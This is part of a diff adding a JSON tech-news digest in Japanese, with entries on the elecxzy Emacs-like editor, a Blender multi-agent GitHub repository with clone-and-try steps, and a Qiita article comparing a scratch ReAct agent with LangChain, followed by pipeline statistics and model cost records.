日本語入力」をもとに公開されたオープンソースのかな漢字変換エンジンMozcのmozcemacshelperを、変換エンジンごと1つのexeで動くようにビルドし直し（mozc-emacs-standalone）、elecxzyに同梱して使えるようにしました。設定で入力方式をmozcにすると、OSのIMEを使わずに日本語を入力できます。\n\nhelperは別プロセスで動き、未確定の文字列と候補ウィンドウはエディタ側で描いています。押されたキーをMozcに渡すかEmacsのコマンドとして実行するかもエディタが決めるので、変換中のキーとEmacsのキーがぶつかりません。C-\\でON／OFFできて、学習とユーザー辞書はelecxzy専用のフォルダに置くので、Emacsで使っているMozcのデータとは混ざりません。\n\n \n同梱のMozcで変換しているところ。候補ウィンドウはエディタのフォントとテーマで描いています\n\n:::note info\n同梱しているhelperはmozc-emacs-standaloneとして公開しています。公式のmozc.elとそのまま話せるので、Windows版のGNU Emacsでも、GUIと-nwのどちらでもC-\\でMozcを使えます。Google日本語入力のインストールは要りません。\n:::\n\nPLaMoで翻訳\n\nM-x translate-regionとM-x translate-bufferで、選択範囲やバッファを翻訳できます。エンジンはPreferred NetworksのPLaMo 3 Translateで、兄弟アプリのelecdexがセットアップしたものを使います。\n\nelecxzyはこのPCの中だけで受け付けるllama-serverを自分で起動して訳すので、文章が外に出ません。訳文は隣のペインに少しずつ流れてきて、translate-region-replaceなら選択範囲を訳文に置き換えます。\n\nhttps://x.com/elecxzy/status/2121586617605656755\n\nカーソルVFX\n\n最後は完全に趣味の機能です。カーソルの動きに合わせて粒子や雷のエフェクトを出せます。C-c 1〜C-c 9で切り替え、C-c 0でOFFです。カーソルを追いかける猫のマスコット「Elenyan」もいます。\n\nhttps://x.com/elecxzy/status/2042946120918405156\n\nhttps://x.com/elecxzy/status/2045442705724203047\n\nM-x crt-effect-modeで画面をブラウン管風にもできます。Emacsにはない楽しみとして、たまにONにしています。\n\nおわりに\n\nelecxzyはEmacsの代わりというより、Emacsが好きな人がWindowsで気軽に使えるエディタを目指しています。設定なしでC-x C-fから書き始められるので、Emacsの操作に慣れた方に一度触ってもらえるとうれしいです。\n\n実装の詳細は、MCPサーバー、ウィンドウのリサイズ、カーソルVFXの記事に書きました。ほかにも、elecxzyをどう作ったかをZennの記事にいろいろ書いているので、よければ見てください。\n\n---\n:::note info\n開発中のエディタ「elecxzy」について\nelecxzyでは、サクサク動くEmacsっぽいキーバインドのエディタを目指して開発を続けています！\n\nRepository: GitHub - kurouna/elecxzy\nDownload: Releases\nX (Twitter): @elecxzy\n\n興味があればぜひ触ってみてください！\n:::",
+      "metrics": {
+        "likes": 1,
+        "stocks": 1,
+        "comments": 0
+      },
+      "sourceWeight": 3,
+      "lang": "ja",
+      "id": "b55ff66680b391f5",
+      "foundIn": [
+        "qiita"
+      ],
+      "preScore": 0.6947916666666667,
+      "popularityPercentile": 0.96875,
+      "matchedTopics": [
+        "AIエージェント構築",
+        "フロントエンドの新技術"
+      ],
+      "buzz": false,
+      "score": 82,
+      "titleJa": null,
+      "oneLiner": "elecxzyはEmacsの操作感を再現したWindows向けエディタとして開発された。",
+      "takeaways": [
+        "Emacsに近いキー操作をすぐ使えるエディタが作られた。",
+        "300を超える操作を同じ名前とキーで収録している。",
+        "設定は専用の画面やJSONファイルから変更できる。"
+      ],
+      "keywords": [
+        "elecxzy",
+        "Emacs",
+        "xyzzy",
+        "Electron",
+        "React",
+        "TypeScript"
+      ],
+      "category": "新機能・新ツール",
+      "lane": "build",
+      "readingMinutes": 7,
+      "payoff": "aware",
+      "durability": "ephemeral",
+      "tryPrompt": null
+    },
+    {
+      "source": "github_repo",
+      "sourceLabel": "GitHub 急上昇リポジトリ",
+      "title": "precygtrucqui1981/blender-ai-copilot-lab — An AI lab for Blender where manager–worker–reviewer agent teams run multi-step scene briefs as supervised experiments—a live task board, review findings, one correction attempt per blocked task, named undo, and a built-in MCP server. · blender-ai-copilot-lab · blender · blender 3d · blender addon · blender plugin · blender extension",
+      "url": "https://github.com/precygtrucqui1981/blender-ai-copilot-lab",
+      "publishedAt": "2026-11-12T19:33:16.000Z",
+      "author": "precygtrucqui1981",
+      "authorDetail": {
+        "name": "precygtrucqui1981",
+        "url": "https://github.com/precygtrucqui1981",
+        "avatarUrl": "https://github.com/precygtrucqui1981.png?size=120",
+        "bio": "An AI lab for Blender where manager–worker–reviewer agent teams run multi-step scene briefs as supervised experiments—a live task board, review findings, one correction attempt per blocked task, named undo, and a built-in MCP server. · blender-ai-copilot-lab · blender · blender 3d · blender addon · blender plugin · blender extension"
+      },
+      "tags": [
+        "3d-automation",
+        "3d-modeling",
+        "blender",
+        "blender-addon",
+        "blender-agents",
+        "blender-ai",
+        "blender-assistant",
+        "blender-automation"
+      ],
+      "snippet": "An AI lab for Blender where manager–worker–reviewer agent teams run multi-step scene briefs as supervised experiments—a live task board, review findings, one correction attempt per blocked task, named undo, and a built-in MCP server. · blender-ai-copilot-lab · blender · blender 3d · blender addon · blender plugin · blender extension",
+      "metrics": {
+        "stars": 506
+      },
+      "sourceWeight": 3,
+      "lang": "en",
+      "id": "7441876053c4f626",
+      "foundIn": [
+        "github_repo"
+      ],
+      "preScore": 0.7878947368421053,
+      "popularityPercentile": 0.2631578947368421,
+      "matchedTopics": [
+        "AI支援開発・品質",
+        "AIエージェント構築"
+      ],
+      "buzz": false,
+      "score": 79,
+      "titleJa": "blender-ai-copilot-lab — Blenderの作業を複数AIで検証する実験環境",
+      "oneLiner": "blender-ai-copilot-labは複数のAI担当がBlenderの作業を分担し検証する環境を提供する。",
+      "takeaways": [
+        "複数のAI担当が3D制作を分担して進める。",
+        "作業の状態と確認結果を画面で追跡できる。",
+        "止まった作業は一度だけ修正して名前付きで戻せる。"
+      ],
+      "keywords": [
+        "blender-ai-copilot-lab",
+        "Blender",
+        "manager-worker-reviewer",
+        "MCP server",
+        "named undo",
+        "agent teams"
+      ],
+      "category": "AI/エージェント",
+      "lane": "build",
+      "readingMinutes": 3,
+      "payoff": "decide",
+      "durability": "ephemeral",
+      "tryPrompt": "# 試すこと\nprecygtrucqui1981/blender-ai-copilot-lab — An AI lab for Blender where manager–worker–reviewer agent teams run multi-step scene briefs as supervised experiments—a live task board, review findings, one correction attempt per blocked task, named undo, and a built-in MCP server. · blender-ai-copilot-lab · blender · blender 3d · blender addon · blender plugin · blender extension を動かして、README の最初の出力まで到達する\nhttps://github.com/precygtrucqui1981/blender-ai-copilot-lab\n\n# 手順\n1. git clone --depth 1 https://github.com/precygtrucqui1981/blender-ai-copilot-lab\n2. cd blender-ai-copilot-lab && ls\n3. README の手順どおりに依存を入れ、最初の出力が出るまで進める\n\n# 確認したいこと\n- README の手順だけで、最初の出力まで到達できるか\n- 動かすのに別途何が必要か（API キー・GUI・別のツール）\n\n# 前提・注意\n- git が入っていること\n- README にビルド手順が無ければ、リポジトリの package.json / Makefile を見る"
+    },
+    {
+      "source": "qiita",
+      "sourceLabel": "Qiita",
+      "title": "ローカルAI構築記　④前回作ったReAct Agentと比較しながらLangChainの中身を理解する",
+      "url": "https://qiita.com/ahaya/items/4432425af222ccf415f8",
+      "publishedAt": "2026-11-19T05:35:35.000Z",
+      "author": "ahaya",
+      "authorDetail": {
+        "name": "ahaya",
+        "handle": "@ahaya",
+        "url": "https://qiita.com/ahaya",
+        "avatarUrl": "https://lh3.googleusercontent.com/a/ACg8ocKufJFaVtkqmlHb7eefSvnE4ZqP910ZlzM3guZ4Hn6h0sIrdQ=s96-c",
+        "bio": "最近退職し、今は個人的な趣味として強化学習や機械学習の実装を行っている66歳のシニアです。お問い合わせなどは ahaya.labs.01[at]gmail.com へ。",
+        "followers": 3,
+        "posts": 13,
+        "links": []
+      },
+      "tags": [
+        "LLM",
+        "React",
+        "llama.cpp",
+        "Qwen",
+        "LangChain"
+      ],
+      "snippet": "ローカルAI構築記 ④前回作ったReAct Agentと比較しながらLangChainの中身を理解する この記事でわかること ・LangChain Agentの基本的な仕組み ・Tool Callingの実装方法 ・createagentの使い方 ・スクラッチ実装とLangChain Agentの対応関係 ・ChatLlamaCppとChatOllamaの違い 目次 1. はじめに 2. LangChain Agentとは 3. スクラッチ実装との対応関係 4. qiitasearch Toolを作成する 5. ChatLlamaCppでAgentを実装する 6. ChatLlamaCppではtoolcallsを取得できなかった 7. ChatOllamaへ移行する 8. createagentでReAct Agentを構築する 9. 動かしてみる 10. スクラッチ実装とLangChai…",
+      "body": "ローカルAI構築記　\n④前回作ったReAct Agentと比較しながらLangChainの中身を理解する\n\nこの記事でわかること\n・LangChain Agentの基本的な仕組み\n・Tool Callingの実装方法\n・createagentの使い方\n・スクラッチ実装とLangChain Agentの対応関係\n・ChatLlamaCppとChatOllamaの違い\n\n目次\n\n1. はじめに\n2. LangChain Agentとは\n3. スクラッチ実装との対応関係\n4. qiitasearch Toolを作成する\n5. ChatLlamaCppでAgentを実装する\n6. ChatLlamaCppではtoolcallsを取得できなかった\n7. ChatOllamaへ移行する\n8. createagentでReAct Agentを構築する\n9. 動かしてみる\n10. スクラッチ実装とLangChain Agentの比較\n11. まとめ\n\n1.はじめに\n一回目の記事では、RTX 5060 Laptop GPU環境でQwen2.5-7B GGUFをllama-cpp-pythonとCUDAを用いてローカル実行できるようにしました。\n・Windows11 + RTX5060でQwen2.5-7Bをllama.cpp CUDA推論するまで ～ Visual Studio 2026問題の解決方法 ～\nhttps://qiita.com/ahaya/items/520b366b03738910fb1f\n\n二回目はQwen2.5とFAISSを利用して、自分のQiita記事を検索するRAGを作りました。\n・ローカルAI構築記　②Qwen2.5とFAISSで自分のQiita記事を検索するローカルRAGを作ってみた\nhttps://qiita.com/ahaya/items/ea30c18e2554da23a2da\n\nそして前回はQwen2.5とFAISSを利用して ReAct Agentをスクラッチ実装しました。\n・ローカルAI構築記 ③ Qwen2.5とFAISSでReAct Agentをスクラッチ実装してみる\nhttps://qiita.com/ahaya/items/97fd1adeb5e8b459aec2\n\n今回は同じ仕組みをLangChain Agentで実装し、 Agentフレームワークが内部でどのような処理を行っているのかを確認してみます。\n\nまた、ChatLlamaCppとChatOllamaで Tool Callingの挙動にどのような違いがあるのかも検証します。\n\n2. LangChain Agentとは\n\n前回はQwen2.5とFAISSを利用して、ReAct Agentをスクラッチ実装しました。\n\nその際、Agentは次のような流れで動作していました。\n\n [code] \n\n一方、LangChain Agentではこれらの処理がフレームワーク内部で実行されます。\n\n例えば、Tool Callingが発生した場合は次のような流れになります。\n\n [code] \n\n3. スクラッチ実装との対応関係\n\nスクラッチ実装とLangChain Agentの対応関係をまとめると表1のようになります。\n\n表1 スクラッチ実装とLangChain Agentの対応\n\n| スクラッチ実装 | LangChain |\n|-----------|-----------|\n| Question | HumanMessage |\n| Thought | AIMessage |\n| Search | Tool |\n| Observation | ToolMessage |\n| Decision | Agent |\n| Answer | AIMessage |\n\nつまりLangChain Agentは、前回自作したReActループをフレームワークとして提供しているものと考えることができます。\n\n今回の記事では、前回作成したQiita記事検索をToolとして登録し、LangChain Agentへ移植してみます。\n\n4. qiitasearch Toolを作成する\n\nLangChain Agentが外部情報を取得するためには、Toolを定義する必要があります。\n\n今回は前回作成したFAISS検索をToolとして登録し、Agentから呼び出せるようにします。\n\n [code] \n\nスクラッチ実装では、Thoughtの後に直接FAISS検索を実行していました。\n\n [code] \n\n一方、LangChain Agentでは検索機能をToolとして登録することで、\n\n [code] \n\nという形で利用できます。\n\n例えば、\n\n [code] \n\nを実行すると、関連記事の内容が返されます。\n\n次章では、このToolを利用してLangChain Agentを構築していきます。\n\n5. ChatLlamaCppでAgentを実装する\n\nToolを定義できたので、次はLangChain Agentを構築します。\n\n今回はLLMとしてQwen2.5を利用し、先ほど作成した qiitasearch をToolとして登録します。\n\n [code] \n\nこれだけでTool Callingが可能なAgentが構築できます。\n\nスクラッチ実装では、\n\n [code] \n\nというループを自前で実装していました。\n\n一方、LangChain Agentでは、\n\n [code] \n\nという流れが内部で自動的に実行されます。\n\nつまり、前回実装したReActループをフレームワークが肩代わりしてくれる形になります。\n\n6. ChatLlamaCppではtoolcallsを取得できなかった\n\nToolを定義し、Agentも構築できたので早速実行してみます。\n\n今回はQwen2.5-7B GGUFを ChatLlamaCpp から利用しました。\n\n [code] \n\nそしてAgentを実行してみます。\n\n [code] \n\nしかし期待したようにToolは呼ばれませんでした。\n\nログを確認すると、QwenはTool Callingらしき出力を生成しています。\n\n [code] \n\nところがLangChain側では toolcalls として認識されません。\n\n [code] \n\nつまり、\n\n [code] \n\nという状態でした。\n\nスクラッチ実装では自分でThoughtとSearchを制御していたため問題になりませんでしたが、LangChain Agentでは toolcalls を正しく生成できないとToolが実行されません。\n\nそこで次章では、ChatLlamaCpp の代わりに ChatOllama を利用し、Tool Callingが正常に動作するか確認してみます。\n\n7. ChatOllamaへ移行する\n\nChatLlamaCpp環境では期待通りに toolcalls を取得できなかったため、今回は Ollama を利用して再度試してみます。\n\nLangChain側のコードはほとんど変更せず、LLMを ChatOllama へ置き換えます。\n\n [code] \n\nAgentの定義はそのまま利用できます。\n\n [code] \n\n同じ質問を実行してみます。\n\n [code] \n\n今度は toolcalls が正しく生成されました。\n\n [code] \n\n続いて qiitasearch が実行され、\n\n [code] \n\nがAgentへ返されます。\n\n最終的にLangChain Agentは、\n\n [code] \n\nというReActループを自動的に実行できるようになりました。\n\nスクラッチ実装では Thought、Search、Observation、Decision を自前で実装しましたが、LangChain Agentではそれらの処理をフレームワークに任せることができます。\n\n次章では、実際にAgentを動かしながらその挙動を確認してみます。\n\n8. createagentでReAct Agentを構築する\n\nToolを定義できたので、次はLangChain Agentを構築します。\n\nLangChainでは createagent() を利用するだけで、Tool Callingに対応したAgentを作成できます。\n\n [code] \n\nスクラッチ実装では、\n\n [code] \n\nというReActループを自前で実装していました。\n\n一方、LangChain Agentでは、\n\n [code] \n\nという流れが内部で自動的に実行されます。\n\nつまり、前回実装したThought、Search、Observation、Decisionの処理をフレームワークが肩代わりしてくれる形になります。\n\nAgentの実行は次のように行います。\n\n [code] \n\nこれだけでLangChain Agentは必要に応じてToolを呼び出し、その結果を利用して回答を生成できます。\n\n次章では、実際にAgentを実行し、Tool Callingの流れを確認してみます。\n\n9. 動かしてみる\n\nそれでは実際にLangChain Agentを動かしてみます。\n\n今回は次の質問を入力してみます。\n\n [code] \n\nAgentを実行します。\n\n [code] \n\nログを確認すると、まずAgentが必要な情報を収集するために qiitasearch を呼び出します。\n\n [code] \n\n続いてToolが実行され、それぞれの検索結果が取得されます。\n\n [code] \n\n最後にAgentは検索結果を統合し、比較回答を生成します。\n\n [code] \n\n処理フローを整理すると次のようになります。\n\n [code] \n\n前回スクラッチ実装したReAct Agentでは、\n\n [code] \n\nというループを自前で実装しました。\n\n一方、LangChain AgentではToolを定義するだけで、同様のReActループをフレームワークが自動的に実行してくれます。\n\n次章では、スクラッチ実装とLangChain Agentの違いを整理してみます。\n\n次章では、スクラッチ実装とLangChain Agentの違いを整理してみます。\n\n10. スクラッチ実装とLangChain Agentの比較\n\nここまで、スクラッチ実装したReAct AgentをLangChain Agentへ移植してみました。\n\n両者を比較すると表2のようになります。\n\n表2 スクラッチ実装とLangChain Agentの比較\n\n| 項目 | スクラッチ実装 | LangChain Agent |\n|--------|--------|--------|\n| Thought | 自前実装 | Agent内部 |\n| Search | FAISS検索を直接呼び出し | Tool |\n| Observation | 検索結果を文字列として管理 | ToolMessage |\n| Decision | 自前実装 | Agent内部 |\n| Answer | 自前実装 | Agent内部 |\n| 実装量 | 多い | 少ない |\n| 内部構造の理解 | しやすい | ブラックボックス化される |\n| 拡張性 | 自由度が高い | LangChainに依存 |\n\nスクラッチ実装では、\n\n [code] \n\nのすべてを自分で実装しました。\n\nそのため、ReAct Agentがどのように動いているのかを詳細に理解できます。\n\n一方、LangChain Agentでは、\n\n [code] \n\nという流れがフレームワーク内部で自動的に実行されます。\n\n実装量は大幅に減りますが、処理の詳細は見えにくくなります。\n\n今回実際に移植してみたことで、\n・Thought → AIMessage\n・Search → Tool\n・Observation → ToolMessage\n・Answer → AIMessage\n\nという対応関係を確認できました。\n\n個人的には、先にスクラッチ実装を経験していたことで、LangChain Agentが内部で何を行っているのか理解しやすくなりました。\n\nその意味では、LangChainを利用する前に一度ReAct Agentを自作してみるのも良い学習方法だと感じました。\n\n11. まとめ\n\n今回は、前回スクラッチ実装したReAct AgentをLangChain Agentへ移植してみました。\n\nスクラッチ実装では、\n\n [code] \n\nというReActループを自前で実装していました。\n\n一方、LangChain Agentでは、\n\n [code] \n\nという処理がフレームワーク内部で自動的に実行されます。\n\nまた、ChatLlamaCpp環境では期待通りに toolcalls を取得できませんでしたが、ChatOllamaへ移行することでTool Callingを利用できることを確認できました。\n\n実際に移植してみたことで、\n・Thought → AIMessage\n・Search → Tool\n・Observation → ToolMessage\n・Answer → AIMessage\n\nという対応関係も理解できました。\n\n特にスクラッチ実装とLangChain Agentの両方を試したことで、Agentの内部動作をより深く理解することができました。\n\nこの記事が、ローカル環境でLLMやAgentの実装に挑戦する方の参考になれば幸いです。",
+      "metrics": {
+        "likes": 1,
+        "stocks": 1,
+        "comments": 0
+      },
+      "sourceWeight": 3,
+      "lang": "ja",
+      "id": "4dc58ecc3f6f0a66",
+      "foundIn": [
+        "qiita"
+      ],
+      "preScore": 0.7740625000000001,
+      "popularityPercentile": 0.9427083333333334,
+      "matchedTopics": [
+        "AIエージェント構築",
+        "フロントエンドの新技術"
+      ],
+      "buzz": false,
+      "score": 78,
+      "titleJa": null,
+      "oneLiner": "この記事はスクラッチ実装との比較を通じてLangChain Agentの仕組みと道具の呼び出し方を検証した。",
+      "takeaways": [
+        "LangChain Agentが作業を進める仕組みを説明している。",
+        "道具を呼び出す処理を手作りの実装と比べている。",
+        "Qwenを動かす方法をChatLlamaCppからChatOllamaへ変更した。"
+      ],
+      "keywords": [
+        "LangChain",
+        "create_agent",
+        "Qwen2.5-7B",
+        "llama.cpp",
+        "ChatLlamaCpp",
+        "ChatOllama"
+      ],
+      "category": "AI/エージェント",
+      "lane": "build",
+      "readingMinutes": 15,
+      "payoff": "apply",
+      "durability": "durable",
+      "tryPrompt": null
+    }
+  ],
+  "stats": {
+    "collected": 1034,
+    "afterDedupe": 984,
+    "afterPreScore": 130,
+    "ranked": 130,
+    "bySource": {
+      "qiita": 577,
+      "zenn": 160,
+      "hatena": 37,
+      "hackernews": 65,
+      "devto": 4,
+      "github_release": 5,
+      "github_repo": 94,
+      "rss": 73,
+      "changelog": 1,
+      "x": 18
+    },
+    "byLane": {
+      "security": 9,
+      "know": 8,
+      "build": 8
+    },
+    "estimatedReadMinutes": 47
+  },
+  "topics": [
+    "クラウド / 本番環境構築",
+    "AI支援開発・品質",
+    "セキュアな開発",
+    "AIプロダクトのUI/UX",
+    "AIエージェント構築",
+    "フロントエンドの新技術",
+    "FDE / 業務改革",
+    "成果の測り方・評価",
+    "データ基盤",
+    "言語 / ランタイム"
+  ],
+  "models": {
+    "rank": "gpt-5.6-luna",
+    "summary": "gpt-5.6-luna"
+  },
+  "usage": {
+    "stages": {
+      "community": {
+        "model": "gpt-5.6-luna",
+        "requests": 1,
+        "inputTokens": 4710,
+        "outputTokens": 637,
+        "cacheReadTokens": 0,
+        "elapsedMs": 6705,
+        "estimatedCostUsd": 0.0017064
+      },
+      "radar:resolve": {
+        "model": "gpt-5.6-luna",
+        "requests": 1,
+        "inputTokens": 3656,
+        "outputTokens": 2400,
+        "cacheReadTokens": 0,
+        "elapsedMs": 17657,
+        "estimatedCostUsd": 0.0036111999999999997
+      },
+      "release": {
+        "model": "gpt-5.6-luna",
+        "requests": 1,
+        "inputTokens": 8163,
+        "outputTokens": 4485,
+        "cacheReadTokens": 0,
+        "elapsedMs": 32141,
+        "estimatedCostUsd": 0.0070146
+      },
+      "score:know": {
+        "model": "gpt-5.6-luna",
+        "requests": 3,
+        "inputTokens": 17174,
+        "outputTokens": 1472,
+        "cacheReadTokens": 3574,
+        "elapsedMs": 14677,
+        "estimatedCostUsd": 0.00527268
+      },
+      "score:security": {
+        "model": "gpt-5.6-luna",
+        "requests": 2,
+        "inputTokens": 6891,
+        "outputTokens": 1095,
+        "cacheReadTokens": 1598,
+        "elapsedMs": 10538,
+        "estimatedCostUsd": 0.00272416
+      },
+      "score:build": {
+        "model": "gpt-5.6-luna",
+        "requests": 3,
+        "inputTokens": 17826,
+        "outputTokens": 1764,
+        "cacheReadTokens": 3728,
+        "elapsedMs": 17835,
+        "estimatedCostUsd": 0.005756560000000001
+      },
+      "describe:security": {
+        "model": "gpt-5.6-luna",
+        "requests": 2,
+        "inputTokens": 12205,
+        "outputTokens": 3460,
+        "cacheReadTokens": 8588,
+        "elapsedMs": 25928,
+        "estimatedCostUsd": 0.006764760000000001
+      },
+      "describe:build": {
+        "model": "gpt-5.6-luna",
+        "requests": 2,
+        "inputTokens": 13787,
+        "outputTokens": 3711,
+        "cacheReadTokens": 8057,
+        "elapsedMs": 26539,
+        "estimatedCostUsd": 0.00737174
+      },
+      "describe:know": {
+        "model": "gpt-5.6-luna",
+        "requests": 2,
+        "inputTokens": 12520,
+        "outputTokens": 4013,
+        "cacheReadTokens": 8064,
+        "elapsedMs": 31277,
+        "estimatedCostUsd": 0.00748088
+      },
+      "deep:security": {
+        "model": "gpt-5.6-luna",
+        "requests": 3,
+        "inputTokens": 37175,
+        "outputTokens": 9134,
+        "cacheReadTokens": 12412,
+        "elapsedMs": 72241,
+        "estimatedCostUsd": 0.01864404
+      },
+      "deep:know": {
+        "model": "gpt-5.6-luna",
+        "requests": 2,
+        "inputTokens": 15230,
+        "outputTokens": 5243,
+        "cacheReadTokens": 11987,
+        "elapsedMs": 43566,
+        "estimatedCostUsd": 0.00957734
+      },
+      "deep:build": {
+        "model": "gpt-5.6-luna",
+        "requests": 2,
+        "inputTokens": 20890,
+        "outputTokens": 5254,
+        "cacheReadTokens": 15805,
+        "elapsedMs": 44810,
+        "estimatedCostUsd": 0.0107989
+      },
+      "digest-summary": {
+        "model": "gpt-5.6-luna",
+        "requests": 1,
+        "inputTokens": 4715,
+        "outputTokens": 225,
+        "cacheReadTokens": 0,
+        "elapsedMs": 2690,
+        "estimatedCostUsd": 0.001213
+      },
+      "digest-outlook": {
+        "model": "gpt-5.6-luna",
+        "requests": 1,
+        "inputTokens": 5672,
+        "outputTokens": 316,
+        "cacheReadTokens": 0,
+        "elapsedMs": 3027,
+        "estimatedCostUsd": 0.0015136000000000001
+      }
+    },
+    "totalCostUsd": 0.0894
+  },
+  "notes": []
+}
